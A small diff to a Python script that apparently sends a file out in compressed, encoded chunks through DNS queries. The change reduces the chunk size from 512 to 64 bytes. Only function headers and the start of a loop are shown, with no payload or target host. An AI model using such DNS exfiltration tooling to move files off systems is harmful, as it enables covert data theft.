@@ -50,7 +50,7 @@ def send_dns_query(data, server_ip, max_delay):
 
 # Function to send file in compressed and encoded chunks
 def send_file_chunks(file_path, resolved_ip, domain, max_delay, total_chunks):
-    chunk_size = 512  # Size of each chunk in bytes (adjust as needed)
+    chunk_size = 64  # Size of each chunk in bytes (adjust as needed)
     
     with open(file_path, "rb") as file:
         for chunk_number in range(total_chunks):
